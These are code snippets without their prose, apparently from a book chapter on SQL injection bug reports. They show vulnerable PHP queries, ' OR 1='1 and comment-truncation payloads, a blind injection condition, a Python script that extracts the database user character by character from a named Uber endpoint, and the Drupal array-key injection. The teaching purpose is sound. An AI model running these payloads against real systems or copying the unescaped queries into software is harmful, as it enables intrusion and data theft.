["```\nSELECT name FROM users WHERE id = 1;\n```", "```\n   $name = ➊$_GET['name'];\n\n   $query = \"SELECT * FROM users WHERE name = ➋'$name' \";\n\n➌ mysql_query($query);\n```", "```\n$query = \"SELECT * FROM users WHERE name = 'test➊' OR 1='1➋' \";\n```", "```\n$name = $_GET['name'];\n\n$password = ➊mysql_real_escape_string($_GET['password']);\n\n$query = \"SELECT * FROM users WHERE name = '$name' AND password = '$password' \";\n```", "```\n$query = \"SELECT * FROM users WHERE name = 'test' OR 1='1' AND password = '12345' \";\n```", "```\nSELECT * FROM players WHERE year = 2010 AND type = 20 AND round = 2;\n```", "```\nSELECT * FROM PLAYERS WHERE year = 2010-- AND type = 20 AND round = 2;\n```", "```\n(2010)and(if(mid(version(),1,1))='5',true,false))--\n```", "```\n➊ import json\n\n   import string\n\n   import requests\n\n   from urllib import quote\n\n   from base64 import b64encode\n\n➋ base = string.digits + string.letters + '_-@.'\n\n➌ payload = {\"user_id\": 5755, \"receiver\": \"blog.orange.tw\"}\n\n➍ for l in range(0, 30):\n\n    ➎ for i in base:\n\n        ➏ payload['user_id'] = \"5755 and mid(user(),%d,1)='%c'#\"%(l+1, i)\n\n        ➐ new_payload = json.dumps(payload)\n\n           new_payload = b64encode(new_payload)\n\n           r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.\n\n   do?p='+quote(new_payload))\n\n        ➑ if len(r.content)>0:\n\n                   print i,\n\n                   break\n```", "```\n$this->expandArguments($query, $args);\n\n$stmt = $this->prepareQuery($query);\n\n$stmt->execute($args, $options);\n```", "```\n   --snip--\n\n➊ foreach(array_filter($args, `is_array`) as $key => $data) {\n\n  ➋ $new_keys = array();\n\n  ➌ foreach ($data as $i => $value) {\n\n       --snip--\n\n    ➍ $new_keys[$key . '_' . $i] = $value;\n\n      }\n\n     --snip--\n\n   }\n```", "```\n['red' => 'apple', 'yellow' => 'banana']\n```", "```\n['apple', 'banana']\n```", "```\ndb_query(\"SELECT * FROM {users} WHERE name IN (:name)\",\n\n  array(':name'=>array('user1','user2')));\n```", "```\nSELECT * FROM users WHERE name IN (:name_0, :name_1)\n```", "```\ndb_query(\"SELECT * FROM {users} where name IN (:name)\",\n\n  array(':name'=>array('test);-- ' => 'user1', 'test' => 'user2')));\n```", "```\nSELECT * FROM users WHERE name IN (:name_test);-- , :name_test)\n```"]